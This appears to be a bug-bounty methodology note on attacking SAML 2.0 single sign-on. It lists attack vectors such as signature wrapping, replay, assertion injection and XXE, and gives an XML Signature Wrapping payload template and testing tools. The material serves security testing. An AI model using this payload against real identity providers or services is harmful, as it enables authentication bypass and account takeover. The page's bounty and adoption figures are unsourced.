> [!abstract] Module: [[4-Methodology/Crow-Hustler/hunter-methodology-V1/hunting/00-index|← Back to Hunting]]

# SAML 2.0 Security

43% of enterprise targets implement SAML SSO. Average bounty for SAML bypass: $15,000.

## Attack Vectors

| Vector | Description |
|--------|-------------|
| **XML Signature Wrapping (XSW)** | Modify signed content without invalidating signature |
| **SAML response replay** | Reuse valid responses across sessions |
| **Assertion injection** | Inject malicious assertions into response |
| **XXE in SAML XML** | External entity injection via SAML requests |
| **Audience restriction bypass** | Accept tokens for different applications |

## XML Signature Wrapping Payload

```xml
<saml:Response>
  <saml:Assertion ID="original">
    <ds:Signature>...</ds:Signature>
    <saml:Subject>victim@target.com</saml:Subject>
  </saml:Assertion>
  <saml:Assertion ID="evil">
    <saml:Subject>attacker@evil.com</saml:Subject>
  </saml:Assertion>
</saml:Response>
```

Tools: `samlfuzzr`, `saml-raider` (Burp extension), `xmlsectool`
